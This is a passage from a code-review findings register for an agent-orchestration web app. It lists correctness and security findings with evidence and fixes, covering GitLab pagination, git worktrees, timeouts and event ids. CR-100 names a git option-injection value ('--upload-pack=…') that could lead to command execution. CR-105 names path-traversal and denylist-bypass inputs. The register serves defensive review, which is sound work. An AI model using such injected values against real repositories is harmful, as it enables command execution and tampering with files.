  - The scoped diff compares the old steps against the agent's raw `data.steps`, not the re-id'd `merged` steps that were actually persisted, so the change banner can show ids that don't exist.
- **Evidence:**
  ```ts
  const visit = (name: string) => { if (visited.has(name)) return; visited.add(name); ... for (const dep of b.dependsOn ?? []) visit(dep); ...
  const { added, removed, changed } = diffBranchSteps(oldSteps, data.steps);   // not merged ids
  ```
- **Suggested fix:** Detect cycles in `validateBranchConstraints` (three-colour DFS) and return a validation error, which triggers the existing retry. Diff against `merged.steps.filter(s => s.branch === branchName)`. Give id-less steps ids before diffing.
- **Effort:** S

### CR-098 [Medium] GitLab list endpoints are not paginated — comments beyond 100 discussions and jobs beyond 20 are silently dropped

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md))
- **Current location:** lib/integrations/gitlab/client.ts (`paginate`)
- **Re-verification note:** Unchanged. Discussions are capped at one page of 100, pipeline jobs use GitLab's default 20 with no paging, and MR lists are unpaged. The resolve node and pipeline gate miss comments and failed or manual jobs on busy MRs. Fix: a private `paginate<T>(path)` in `GitLabClient` that uses `per_page=100` and follows `x-next-page` up to a bounded page cap.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-06
- **Related:** CR-225 (DATA-45)
- **Location:** `lib/integrations/gitlab/client.ts:98-102`, `lib/integrations/gitlab/client.ts:125-127`, `lib/integrations/gitlab/client.ts:147-149`
- **Problem:**
  - `listMRDiscussions` fetches only the first page (`per_page=100`), so the resolve node never sees later comments on busy MRs.
  - `listPipelineJobs` uses GitLab's default `per_page=20` with no paging. Pipelines with more than 20 jobs lose failed or manual jobs, so the pipeline gate cannot find the failure trace or play manual gates.
  - Neither follows `X-Next-Page` or `Link`.
- **Evidence:**
  ```ts
  async listPipelineJobs(projectPath: string, pipelineId: number) {
    return this.api(`/projects/${projectPath}/pipelines/${pipelineId}/jobs`);
  }
  ...
  return this.api(`/projects/${projectPath}/merge_requests/${mrIid}/discussions?per_page=100`);
  ```
- **Suggested fix:** Add a private `paginate<T>(path)` helper in `GitLabClient` that requests `per_page=100` and follows `x-next-page` up to a bounded page cap. Use it for discussions, jobs and MR lists.
- **Effort:** S

### CR-099 [Medium] GitLab API errors are untyped strings with the full response body; no 429/5xx retry

- **Status at `abaa007`:** **Fixed** ([Task 31](review-tasks/31-git-host-clients.md))
- **Current location:** lib/engine/ports/git-host-errors.ts; lib/integrations/gitlab/client.ts
- **Re-verification note:** Unchanged. `api()` throws a plain Error that embeds the full response body, with the status buried in the text. There is no typed error and no 429/5xx retry, so a rate limit during polling fails the node. Fix: `GitHostApiError {status, path, retryAfterMs}` (plus NotFound/Auth subclasses) in the git-host port, with the body truncated to about 500 chars. Add bounded retry with `Retry-After` for idempotent GETs on 429/502/503/504.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-07
- **Related:** CR-025 (DATA-05); CR-046 (APP-10, ENG-28)
- **Location:** `lib/integrations/gitlab/client.ts:75-82`, `lib/integrations/gitlab/client.ts:143`, `lib/integrations/gitlab/git-host.ts:223`, `lib/integrations/gitlab/git-host.ts:238`
- **Problem:** Failures throw a plain `Error` whose message embeds the entire response body, which can be a multi-KB HTML error page. The HTTP status is buried in the text, so callers cannot tell 401 (bad token), 404 (MR gone), 409 or 429 (rate limit) apart without regex. There is no `Retry-After`/backoff handling, so a 429 during polling fails the node. "not found" cases also throw a plain `Error`, while AGENTS.md section 3.2 requires typed error classes.
- **Evidence:**
  ```ts
  if (!res.ok) throw new Error(`GitLab ${path} failed (${res.status}): ${await res.text()}`);
  ```
- **Suggested fix:** Introduce `GitHostApiError { status, path, retryAfterMs }` (plus `GitHostNotFoundError` and `GitHostAuthError`) in the git-host port. Truncate the body to about 500 chars. Retry idempotent GETs on 429/502/503/504 with bounded backoff that honours `Retry-After`.
- **Effort:** M

### CR-100 [Medium] Branch and ref names reach git argv without validation or a `--` separator (option-injection surface)

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/git/worktrees.ts:485-489, 636; lib/git/local.ts:87, 108, 150, 161, 163, 187; lib/integrations/local-agent/agent.ts:123, 133, 138; lib/engine/runtime/fanout/merge-arena.ts:169, 219, 234, 278-280; lib/engine/nodes/kinds/build/build-run-support.ts:31-44; lib/engine/nodes/kinds/plan/schema.ts:15
- **Re-verification note:** There is still no branch-name validation or `--end-of-options` before positional refs. `branch_pattern` tokens (`{suffix}`, `{ticket}`) are unsanitized, and the plan step `branch` is a bare `z.string()`. Branch-record `name` is regex-validated, so only the pattern and ticket path remains. Fix: `assertValidBranchName()` in `lib/git` (reject a leading `-`, run `git check-ref-format --branch`, throw `InvalidBranchNameError`) at every public entry point. Insert `--end-of-options` where git supports it.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-09
- **Related:** CR-214 (DATA-34)
- **Location:** `lib/git/worktrees.ts:298-306`, `lib/git/worktrees.ts:484-489`, `lib/git/worktrees.ts:636`, `lib/git/local.ts:81`, `lib/git/local.ts:101`, `lib/git/local.ts:113-114`, `lib/git/local.ts:139`, `lib/git/local.ts:149`, `lib/git/local.ts:175`, `lib/integrations/local-agent/agent.ts:123`, `lib/integrations/local-agent/agent.ts:134`, `lib/integrations/local-agent/agent.ts:138`
- **Problem:** Branch names come from the `branch_pattern` knob (`build-node.ts:132-145`, where `{suffix}` and `{ticket}` are unsanitized) and from agent-produced plan meta (`plan/schema.ts:14`, `branch: z.string()`). They are interpolated directly into `git fetch origin <branch>`, `git push … <branch>`, `checkout`, `branch -d`, `rev-parse`. The default naming prefixes `feature/…`. However, a custom pattern starting with `{suffix}` or `{ticket}`, or a future caller, lets a value like `--upload-pack=…` be parsed as an option, which can lead to command execution via `git fetch`. Invalid names (spaces, `..`, `~`) also fail with opaque git errors deep in the run.
- **Evidence:**
  ```ts
  await exec("git", [...git, "fetch", "origin", branch], { maxBuffer: 10 << 20 })
  ...
  await this.git(["-C", repoPath, "branch", force ? "-D" : "-d", branch]);
  ```
- **Suggested fix:** Add a `assertValidBranchName(name)` guard in `lib/git`. It should reject a leading `-`, then run `git check-ref-format --branch` (or an equivalent regex), and throw a typed `InvalidBranchNameError`. Call it at every public entry point (`createWorktree`, `pushBranch`, `diffBranch`, `localBranchState`, `ensureBranch`). Where git supports it, put `--end-of-options` before positional refs.
- **Effort:** M

### CR-101 [Medium] Local-agent `ensureBranch` runs git with no timeout and can target the server's own cwd when no workspace is given

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/local-agent/agent.ts:121-142, 168-170; lib/integrations/local-agent/agent-port.ts:37-38
- **Re-verification note:** `ensureBranch` still runs `git fetch`/`rev-parse`/`checkout` with no timeout, so a stalled remote blocks `createRun`. The port still falls back to `workspace: ""`. That fallback is latent today because `AgentRunner` always sets `spec.workspace = requireRunCwd(ctx)`, but any other caller would run git in `process.cwd()`. Fix: route `ensureBranch` through the bounded git wrapper (like `lib/git/local.ts:46-53`), and throw a typed error in the port when neither cwd nor workspace is set.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-10
- **Related:** CR-025 (DATA-05); CR-102 (DATA-11); CR-214 (DATA-34)
- **Location:** `lib/integrations/local-agent/agent.ts:121-142`, `lib/integrations/local-agent/agent-port.ts:34-35`
- **Problem:**
  - `ensureBranch` calls `git fetch` and `git checkout` with no `timeout`, unlike every other git call in the codebase. `git/local.ts:12` notes that SSH can stall about 75s, so a dead remote blocks `createRun` for that long.
  - The port passes `workspace: spec.cwd ?? spec.workspace ?? ""`. With an empty string, `git -C ""` operates on `process.cwd()`, which is the DevFlow checkout itself, and may `checkout -b` there.
  - `cursorAgent.createRun` then uses `cwd: ""`. The `input.cwd && !exists` guard is skipped because `""` is falsy, and `??` does not replace `""`.
- **Evidence:**
  ```ts
  workspace: spec.cwd ?? spec.workspace ?? "",
  ...
  await exec("git", [...git, "fetch", "origin", branch], { maxBuffer: 10 << 20 }).catch(() => {});
  ```
- **Suggested fix:** Reuse the shared bounded git wrapper (DATA-34 (CR-214)) for `ensureBranch`. In the port, throw a typed error when neither `cwd` nor `workspace` is set instead of defaulting to `""`.
- **Effort:** S

### CR-102 [Medium] `local_agent.timeout_ms` setting is exposed in Settings but never enforced — local runs can run forever

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/local-agent/agent.ts:86-95, 159-184, 209-220; app/api/settings/route.ts:82, 140-145
- **Re-verification note:** Unchanged. `local_agent.timeout_ms` is settable and validated in Settings but nothing reads `defaults().timeoutMs`. `createRun` forwards only sandbox/force, and `streamRun` has no timer, so a wedged local run keeps the node `running` and holds the worktree forever. Fix: arm a timer in `streamRun` (or the port's `stream`) that calls `cancelRun` after `timeoutMs` and rejects with a typed `AgentRunTimeoutError`, or remove the setting.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-11
- **Related:** CR-025 (DATA-05); CR-101 (DATA-10)
- **Location:** `lib/integrations/local-agent/agent.ts:86-95`, `lib/integrations/local-agent/agent.ts:167-183`
- **Problem:** `defaults()` reads `timeoutMs` (default 30 min), and `app/api/settings/route.ts:82,145` lets the user set it. But `createRun` only forwards `sandbox` and `force`. No code in `lib/` or `app/` reads `defaults().timeoutMs`. A wedged local agent keeps its node `running` and holds the worktree indefinitely.
- **Evidence:**
  ```ts
  const opts = this.defaults();
  ...
  sandbox: opts.sandbox,
  force: opts.force,
  ```
- **Suggested fix:** Arm a timer in `streamRun`, or in the port's `stream`, that calls `cursorAgent.cancelRun(runId)` after `timeoutMs` and rejects with a typed `AgentRunTimeoutError`. Otherwise remove the setting.
- **Effort:** S

### CR-103 [Medium] Cache/dep copy falls back to synchronous `fs.cpSync` after a timeout, blocking the Node event loop

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktree-setup.ts:521-531, lib/git/worktree-setup.ts:23
- **Re-verification note:** `copyDirCoW` still catches every `cp` failure, including the 120s timeout, and then runs a synchronous `fs.cpSync` over the partial copy, which blocks the whole server. Fix: use `await fs.promises.cp`; on timeout (`err.killed`), remove the partial `dst` and report failure; fall back only when the clone is unsupported.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-12
- **Location:** `lib/git/worktree-setup.ts:521-531`, `lib/git/worktree-setup.ts:23`
- **Problem:** `copyDirCoW` runs `cp -cR` with a 120s timeout. On any failure, including that timeout on a large `node_modules`/`.next`/`target`, it calls `fs.cpSync(...)` synchronously over the same tree, on top of the partial copy. That blocks the whole Next.js server (all routes and pollers) for as long as the copy takes, which is exactly the slow case. `CacheCopyStep` documents itself as "best-effort", but it can freeze the process.
- **Evidence:**
  ```ts
  await execFileAsync("cp", [...flags, src, dst], { timeout: COPY_TIMEOUT_MS, maxBuffer: MAX_BUFFER });
  return;
  } catch { /* non-clone fs or cp failure — plain copy below */ }
  }
  fs.cpSync(src, dst, { recursive: true, dereference: false });
  ```
- **Suggested fix:** Use `await fs.promises.cp(...)`. Do not fall back after a timeout (`err.killed`): remove the partial `dst` and report failure instead. Fall back only when `cp` reports clone-unsupported.
- **Effort:** S

### CR-104 [Medium] Setup/install commands: the timeout kills only the shell, and there is no cancellation path

- **Status:** Fixed (Task 33)
- **Current location:** lib/git/worktree-setup.ts:534-551
- **Re-verification note:** `runCommand` still uses `exec(..., { shell: "/bin/bash", timeout })`. The timeout kills only the bash process, so grandchildren of compound install/setup commands keep running, and there is no `AbortSignal` to cancel setup when a flow is cancelled or deleted. Fix: `spawn` with `detached: true`, kill the process group on timeout or abort, and thread an `AbortSignal` through `WorktreeSetupInput`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-13
- **Related:** CR-025 (DATA-05)
- **Location:** `lib/git/worktree-setup.ts:534-551`
- **Problem:** `exec(command, { shell: "/bin/bash", timeout })` sends SIGTERM to the bash process only. For compound commands (`pnpm i && pnpm build`, or user `setup_command`s) the grandchildren keep running as orphans after the 10-minute timeout and keep writing into the worktree. There is also no `AbortSignal`, so cancelling or deleting a flow mid-setup cannot stop the install.
- **Evidence:**
  ```ts
  await execAsync(command, {
    cwd,
    timeout: timeoutMs ?? DEFAULT_SETUP_TIMEOUT_MS,
    maxBuffer: MAX_BUFFER,
    shell: process.platform === "win32" ? undefined : "/bin/bash",
  });
  ```
- **Suggested fix:** Use `spawn` with `detached: true` and kill the process group (`process.kill(-pid, "SIGTERM")`, then SIGKILL after a grace period) on timeout or abort. Thread an `AbortSignal` through `WorktreeSetupInput`.
- **Effort:** M

### CR-105 [Medium] `shared_dirs` entries are not confined to the hub/worktree (path traversal) and the denylist is bypassable

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/git/worktree-setup.ts:116-131, lib/git/worktree-setup.ts:490-515
- **Re-verification note:** `SharedDirsStep` still does `path.join(hub|wt, spec)` without normalizing or checking containment, so `../x` creates links outside the worktree. The `DENIED_SHARED_DIRS` exact-string `Set` check is bypassed by `./node_modules`, `node_modules/` or `a/../node_modules`. Fix: normalize, reject absolute paths and paths starting with `..`, assert `containsPath(hub, src)` and `containsPath(wt, dst)`, and check every path segment against the denylist.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-14
- **Location:** `lib/git/worktree-setup.ts:117-131`, `lib/git/worktree-setup.ts:490-515`
- **Problem:** Plain (non-glob) specs are joined as-is. `../../somewhere` produces a `src` outside the hub and a `dst` outside the worktree, so a symlink is created at an arbitrary path relative to the worktree's parent. The `DENIED_SHARED_DIRS` check is an exact-string `Set` lookup, so `./node_modules`, `node_modules/` and `a/../node_modules` bypass the "dep trees must never be linked" rule. Agents could then mutate the hub's real `node_modules` through the link.
- **Evidence:**
  ```ts
  const src = path.join(this.ctx.hub, spec);
  const dst = path.join(this.ctx.wt, spec);
  ...
  if (WorktreeSetup.DENIED_SHARED_DIRS.has(spec)) {
  ```
- **Suggested fix:** Normalize each spec with `path.posix.normalize`, strip trailing slashes, and reject absolute paths or any path starting with `..`. Assert `containsPath(hub, src) && containsPath(wt, dst)`. Check the denylist against every segment of the normalized path.
- **Effort:** S

### CR-106 [Medium] Per-flow clone dir and per-flow worktree dir are the same path (`workspaces/<flowId>`)

- **Status at `abaa007`:** **Fixed** ([Task 20](review-tasks/20-merge-arena-and-workspaces.md))
- **Current location:** lib/git/workspace-paths.ts, lib/git/local.ts, lib/engine/runtime/worktree-lifecycle.ts, lib/engine/runtime/fanout/merge-arena.ts
- **Re-verification note:** `LocalGit.cloneDir(flowId)`, `workspaceForFlow(flowId)` and `WorktreeManager.worktreeDirForFlow(flowId)` all still resolve to `workspaces/<flowId>`. `MergeArena.ensureWorkspace` now calls `localGit.ensureClone(parentFlowId)` on every arena use, which clones into, or runs `fetch --prune` against, the same directory the parent's local worktree occupies. Fix: namespace the two roots (`workspaces/clones/<id>` and `workspaces/worktrees/<id>`) through one path-builder; no legacy-dir migration is needed.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-15
- **Related:** CR-008 (ENG-03); CR-107 (ENG-45, DATA-16)
- **Location:** `lib/git/local.ts:62-76`, `lib/git/local.ts:226-234` (collides with `lib/engine/worktree-lifecycle.ts:76-78`)
- **Problem:** `LocalGit.cloneDir(flowId)` and `WorktreeManager.worktreeDirForFlow(flowId)` both resolve to `path.join(config.workspace.dir(), flowId)`.
  - If a flow ever hits the clone fallback (for example `diffBranch` without a valid `localPath`, or a repo switched from cloud to local), the later `createWorktree` hits `prepareDir`. That refuses the non-empty dir (the clone's `.git` is a directory), so the local build fails.
  - Conversely, `workspaceForFlow` and `ensureClone` treat a worktree as a clone (its `.git` is a file, but `existsSync` is true). `ensureClone` then runs `fetch --prune` against the developer's hub repo.
- **Evidence:**
  ```ts
  cloneDir(flowId: string): string {
    return path.join(config.workspace.dir(), flowId);
  }
  ```
- **Suggested fix:** Namespace the two directories, e.g. `workspaces/clones/<flowId>` and `workspaces/worktrees/<flowId>`, through one path-builder class. Keep sweep compatibility by migrating existing dirs, or by teaching the sweep both roots.
- **Effort:** M

### CR-107 [Medium] Worktree ensure is de-duplicated per `flow:branch` while the directory is per flow, so concurrent runs can switch branches under a live agent

- **Status at `abaa007`:** **Fixed** ([Task 20](review-tasks/20-merge-arena-and-workspaces.md))
- **Current location:** lib/engine/runtime/worktree-lifecycle.ts (ensureForRun), lib/git/worktrees.ts (dir mutex, dirty-aware switch)
- **Re-verification note:** `ensureInFlight` is still keyed on `${flowId}:${branch}` while the directory is per flow. `createWorktree` on an existing worktree still calls `switchWorktreeBranch`, which checks out another branch with no dirty check and no lock, and only warns on failure. Fix: key on `flowId` and re-check the branch once the in-flight ensure settles; refuse to switch when `isWorktreeDirty`, returning `{ switched: false, reason }`; add a per-directory async mutex around create, switch and remove.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations; Area 2 — Engine core & shared lib
- **Source:** DATA-16, ENG-45 (merged duplicate)
- **Status:** Needs verification
  - DATA-16: "Needs verification: whether the engine can run two branches of one flow concurrently in local mode."
- **Related:** CR-008 (ENG-03); CR-106 (DATA-15)
- **Location:**
  - DATA-16: `lib/git/worktrees.ts:288-291`, `lib/git/worktrees.ts:480-495`
  - ENG-45: `lib/engine/worktree-lifecycle.ts:183-193`, `lib/engine/worktree-lifecycle.ts:76-78`
- **Suggested fix (combined):** Fix both layers: key `ensureInFlight` on `flowId` and re-check the branch after an in-flight ensure settles (`lib/engine/worktree-lifecycle.ts`, ENG-45), and in `lib/git/worktrees.ts` refuse `switchWorktreeBranch` when the worktree is dirty, return `{ switched: false, reason }` instead of warn-and-continue, and add a per-directory async mutex around create/switch/remove (DATA-16).
- **Effort:** M (sources: DATA-16 M, ENG-45 S)

Original findings, verbatim:

#### DATA-16 (Area 4 — DB, git, integrations): Reusing a registered worktree silently checks out a different branch under a possibly running agent

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/git/worktrees.ts:288-291`, `lib/git/worktrees.ts:480-495`
- **Problem:** When `dir` is already a worktree, `createWorktree` calls `switchWorktreeBranch`, which runs `git checkout <other branch>` with no dirty check and no lock. The engine coalesces only by `flowId:branch` (`worktree-lifecycle.ts:185`), while the dir is per-flow. Two runs of the same flow on different branches (multi-branch builds or step branches) would flip the branch under a live agent and carry its uncommitted changes across. Failures are swallowed with `console.warn`. Needs verification: whether the engine can run two branches of one flow concurrently in local mode.
- **Evidence:**
  ```ts
  if (existing) {
    const headBranch = await this.switchWorktreeBranch(dir, branch, input.base);
    return { dir, branch, headBranch: headBranch ?? branch, base: null, reused: true };
  }
  ```
- **Suggested fix:** In the pure layer, refuse the switch when `isWorktreeDirty(dir)`, and return `{ switched: false, reason }` instead of warn-and-continue. Add a per-dir async mutex in `Worktrees` (keyed by the resolved dir) around create, switch and remove.
- **Effort:** M

#### ENG-45 (Area 2 — Engine core & shared lib): Worktree ensure de-dup key includes the branch, while the worktree directory is per flow

- **Severity:** Low
- **Category:** Correctness
- **Location:** `lib/engine/worktree-lifecycle.ts:183-193`, `lib/engine/worktree-lifecycle.ts:76-78`
- **Problem:** `ensureInFlight` is keyed `${flowId}:${branch}`, but every branch of a flow maps to the same `workspaces/<flowId>` directory. Two concurrent runs of one flow that resolve different branches (for example `mr_branch` against a refine's `defaultBranch` before the tree exists) both run `createWorktree` on the same directory.
- **Evidence:**
  ```ts
  const key = `${ctx.flow.id}:${branch}`;
  const inflight = this.ensureInFlight.get(key);
  ```
- **Suggested fix:** Key on `ctx.flow.id`. A waiter that wanted a different branch should then re-check after the in-flight ensure settles.
- **Effort:** S

### CR-108 [Medium] Event ids are not monotonic within a millisecond, so the events cursor (`id > after`) can silently skip events

- **Status at `abaa007`:** **Fixed** ([Task 30](review-tasks/30-events-feed.md) — monotonic `Database.uid()` same-ms sequence)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations; Area 1 — App/API (app/, loaders/)
- **Source:** DATA-17, APP-19 (merged duplicate)
- **Related:** CR-026 (FLOWUI-01); CR-047 (APP-11); CR-119 (FLOWUI-04)
- **Location:**
  - DATA-17: `lib/db/index.ts:836-838` (consumed by `app/api/flows/[id]/events/route.ts:16`)
  - APP-19: `app/api/flows/[id]/events/route.ts:15-18`
- **Suggested fix (combined):** Pick one fix: make `Database.uid()` monotonic (ULID-style with a per-process same-ms counter held on the `Database` instance), or page events on a monotonic key (`rowid`, or `(created_at, id)` tuple cursor). A new `seq` column is a schema change and needs approval. Both reviewers identified the same root cause from opposite ends (DATA-17 the id generator, APP-19 the route query).
- **Effort:** S (sources: DATA-17 S, APP-19 S)

Original findings, verbatim:

#### DATA-17 (Area 4 — DB, git, integrations): `Database.uid()` is not monotonic within a millisecond — id-cursor event polling can skip events

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/db/index.ts:836-838` (consumed by `app/api/flows/[id]/events/route.ts:16`)
- **Problem:** Ids are `prefix + base36(Date.now()) + random`. The events route pages with `WHERE id > ? ORDER BY created_at, id`. Two events emitted in the same millisecond get random relative order. If the client's cursor lands on the larger one before the smaller one is committed, which is common during streamed tool and assistant bursts, the smaller one is never returned. It is silently missing from the live feed.
- **Evidence:**
  ```ts
  uid(prefix = ""): string {
    return prefix + Date.now().toString(36) + Math.random().toString(36).slice(2, 9);
  }
  ```
- **Suggested fix:** Make ids monotonic, either with a ULID-style generator holding a per-process counter for same-ms ids (an instance field on `Database`), or by paginating events on `rowid`.
- **Effort:** S

#### APP-19 (Area 1 — App/API (app/, loaders/)): The events cursor (`id > after`) can skip events written in the same millisecond

- **Severity:** Low
- **Category:** Correctness
- **Location:** `app/api/flows/[id]/events/route.ts:15-18`
- **Problem:** Event ids are `"ev_" + Date.now().toString(36) + random7` (`lib/db/index.ts:836-838`). Within one millisecond the order is random. Suppose event A (suffix `zz…`) is returned and becomes the cursor, and event B is then inserted in the same ms with suffix `aa…`. B sorts before A, `id > after` excludes it, and B never reaches the UI. The query also orders by `created_at, id` but filters on `id` alone, so the cursor depends on the two orders agreeing.
- **Evidence:**
  ```sql
  SELECT * FROM events WHERE flow_id=? AND id > ? ORDER BY created_at, id LIMIT ?
  ```
- **Suggested fix:** Page on a monotonic key: the `rowid` or an `INTEGER PRIMARY KEY AUTOINCREMENT seq`, which is a schema change and needs approval. Without a schema change, use `(created_at, id) > (?, ?)` with the cursor carrying both values and accept the remaining edge case.
- **Effort:** S

### CR-109 [Medium] Cursor `getRun`/`reattachRun` swallow every error as "still running"

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/cursorSdk.ts:338-385, lib/integrations/cursor/client.ts:77-80, lib/integrations/cursor/agent-port.ts:58-60
- **Re-verification note:** `getRun` and `reattachRun` still wrap everything in `catch { return null }`, so auth failures, 404s and network errors look the same as "still running" or "terminal" to reconcile. Fix: return a discriminated result (`running | done | unavailable{error}`) or throw a typed `AgentRunLookupError`, and update the `AgentPort.getRun` contract.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-18
- **Location:** `lib/integrations/cursorSdk.ts:337-359`, `lib/integrations/cursorSdk.ts:366-384`, `lib/integrations/cursor/client.ts:77-80`
- **Problem:** `getRun` is documented as returning "null while it is still in flight" (`cursor/client.ts:77`), but it also returns `null` for an auth failure (key removed or rotated), a 404 on an unknown run, or a network error. Reconcile cannot tell a run that is still going from one that is unknowable. Runs then stay `running` forever, or are failed as "server restarted" without the real cause.
- **Evidence:**
  ```ts
  if (run.status === "running") return null; // still going
  return await run.wait();
  ...
  } catch {
    return null;
  }
  ```
- **Suggested fix:** Return a discriminated result (`{ state: "running" } | { state: "done", result } | { state: "unavailable", error }`), or rethrow a typed `AgentRunLookupError`. Update the port contract to match.
- **Effort:** M

### CR-110 [Medium] Cloud-run cancel after a restart is a silent no-op that reports success

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/cursor/client.ts:96-98, lib/integrations/cursor/agent-port.ts:62-69, lib/integrations/cursorSdk.ts:271-277
- **Re-verification note:** `CursorClient.cancelRun` still discards the boolean from `cursorAgent.cancelRun`, and the port returns `true` unless it throws. After a restart, a cloud run keeps going while the UI shows it cancelled, and `run.cancel()` rejections are swallowed. Fix: when there is no live handle and the agent id starts with `bc-`, re-attach via `Agent.getRun(..., { runtime: "cloud" })` and call `cancel()`; propagate the result or a typed error.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-19
- **Related:** CR-056 (ENG-11)
- **Location:** `lib/integrations/cursor/client.ts:96-98`, `lib/integrations/cursor/agent-port.ts:59-66`, `lib/integrations/cursorSdk.ts:272-277`
- **Problem:** `cursorAgent.cancelRun` returns false when the in-process handle is gone, for example after a restart, but `CursorClient.cancelRun` discards that value and the port always returns `true`. Cloud runs are durable by id, so after a restart a user's cancel leaves the VM run going, still billing and still pushing commits, while the UI shows it cancelled. `run.cancel()` errors are also swallowed.
- **Evidence:**
  ```ts
  async cancelRun(agentId: string, runId: string) {
    cursorAgent.cancelRun(runId);
  }
  ```
- **Suggested fix:** When there is no live handle and `agentId` starts with `bc-`, re-attach via `Agent.getRun(runId, { runtime: "cloud", agentId, apiKey })` and call `cancel()`. Propagate the boolean or a typed error to the port.
- **Effort:** S

### CR-111 [Medium] `pumpRun` can leave a rejected `run.wait()` promise unhandled

- **Status:** Fixed (Task 32)
- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
- **Current location:** lib/integrations/cursorSdk.ts:299-307
- **Re-verification note:** `pumpRun` still creates `done = run.wait()` before the `for await` stream loop, with no handler attached. If `stream()` throws and `wait()` later rejects, the rejection is unhandled and can crash the process. Fix: wrap the loop in `try/finally` and `await done.catch(() => {})` in the finally block (or attach a catch immediately).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-20
- **Status:** Needs verification
  - DATA-20: "Needs verification of SDK semantics: whether `wait()` rejects or resolves with status `error` on cancel."
- **Related:** CR-061 (ENG-16)
- **Location:** `lib/integrations/cursorSdk.ts:299-307`
- **Problem:** `run.wait()` is created before the stream loop. If `run.stream()` throws (cancel, network, SDK error), the function exits without awaiting `done`. If `done` then also rejects, which is likely on cancel or error, it becomes an unhandled rejection, and Node's default `--unhandled-rejections=throw` crashes the process. Needs verification of SDK semantics: whether `wait()` rejects or resolves with status `error` on cancel.
- **Evidence:**
  ```ts
  const done = run.wait();
  for await (const msg of run.stream()) {
    this.dispatch(msg, cb);
  }
  const result = await done;
  ```
- **Suggested fix:** Attach a handler immediately (`done.catch(() => {})` and still `await done` on the happy path), or wrap the loop in `try { … } finally { await done.catch(() => {}) }`.
- **Effort:** S

### CR-112 [Medium] One malformed JSON column fails the entire `rows.all()` read

- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
- **Current location:** lib/db/rows.ts:17-29, lib/db/rows.ts:414-430
- **Re-verification note:** `jsonCol` still turns a parse failure into a Zod issue, and `RowGateway.all` still calls `schema.parse` per row, so one bad JSON cell (for example non-object `events.data` from `emitEvent`) throws for the whole list, with no table, column or row id in the error. Fix: use `safeParse` in `RowGateway`, raise or log a typed `RowDecodeError` with context, and skip bad rows in `all`; optionally make read-tolerant columns fall back to `null`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 4 — DB, git, integrations
- **Source:** DATA-21
- **Related:** CR-115 (DATA-24)
- **Location:** `lib/db/rows.ts:17-29`, `lib/db/rows.ts:420-426`
- **Problem:** `jsonCol` turns a parse failure into a Zod issue, and `RowGateway.all` uses `schema.parse` per row inside `.map`. A single bad `events.data`, `nodes.config` or `flow_template_nodes.trigger` value (legacy rows, hand edits, a non-object JSON such as an array passed to `emitEvent(data)`) throws a `ZodError` for the whole query. The flow page, graph and templates list then 500 instead of degrading one row. The error does not include the table, column or row id either.
- **Evidence:**
  ```ts
  } catch {
    ctx.addIssue({ code: z.ZodIssueCode.custom, message: "invalid JSON column" });
    return z.NEVER;
  }
  ...
  return db.all<unknown>(sql, ...(args as never[])).map((r) => schema.parse(r));
  ```
- **Suggested fix:** Have `RowGateway` use `safeParse`, log a typed `RowDecodeError` with the SQL and row id, and either skip the row or, for `get`, throw that typed error. Optionally let `jsonCol` fall back to `null` for read-tolerant columns such as `events.data`.
- **Effort:** S

### CR-113 [Medium] Missing indexes for hot queries

- **Status at `abaa007`:** **Open**, fix in [Task 34](review-tasks/34-db-row-safety.md)
- **Current location:** lib/db/schema.sql:20-37, lib/db/schema.sql:83, lib/db/schema.sql:114-131, lib/db/schema.sql:151-162, lib/db/schema.sql:299-302, lib/db/schema.sql:325-339
- **Re-verification note:** No new indexes were added. `runs(node_id|flow_id|run_ref|status)`, `flows(parent_flow_id|gitlab_project_id|status|template_id)`, `plan_steps(sub_flow_id)`, `step_merges(flow_id)` and `hook_deliveries(created_at)` are still unindexed; `cursor_run_id` was renamed to `run_ref`. The redundant `UNIQUE(discussion_id, id)` on `comments` is still there. Fix: add `CREATE INDEX IF NOT EXISTS` statements; this is a schema change, so get approval first.

- **Severity:** Medium
- **Category:** Correctness
